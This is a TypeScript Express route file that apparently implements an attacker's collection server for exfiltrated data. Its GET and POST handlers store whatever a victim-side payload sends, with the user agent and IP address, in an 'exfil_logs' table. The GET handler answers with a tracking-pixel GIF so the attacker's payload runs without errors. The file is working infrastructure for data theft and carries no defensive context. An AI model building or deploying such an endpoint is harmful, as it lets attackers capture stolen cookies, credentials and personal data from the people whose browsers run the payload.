import { Router, Request } from 'express';
import { query } from '../db';

const router = Router();

// Collect endpoint for exfiltrated data
router.get('/', async (req: Request, res) => {
  try {
    const data = req.query.d as string || JSON.stringify(req.query);
    const userAgent = req.headers['user-agent'] || '';
    const ipAddress = req.ip || req.socket.remoteAddress || '';

    await query(
      'INSERT INTO exfil_logs (data, user_agent, ip_address) VALUES ($1, $2, $3)',
      [data, userAgent, ipAddress]
    );

    console.log('📦 Data collected:', { data, userAgent, ipAddress });

    // Return a 1x1 transparent pixel to avoid errors in attacker's payload
    res.setHeader('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
  } catch (error) {
    console.error('Collect error:', error);
    res.status(500).send('Error');
  }
});

router.post('/', async (req: Request, res) => {
  try {
    const data = JSON.stringify(req.body);
    const userAgent = req.headers['user-agent'] || '';
    const ipAddress = req.ip || req.socket.remoteAddress || '';

    await query(
      'INSERT INTO exfil_logs (data, user_agent, ip_address) VALUES ($1, $2, $3)',
      [data, userAgent, ipAddress]
    );

    console.log('📦 Data collected:', { data, userAgent, ipAddress });

    res.json({ success: true });
  } catch (error) {
    console.error('Collect error:', error);
    res.status(500).json({ error: 'Failed to collect data' });
  }
});

export default router;
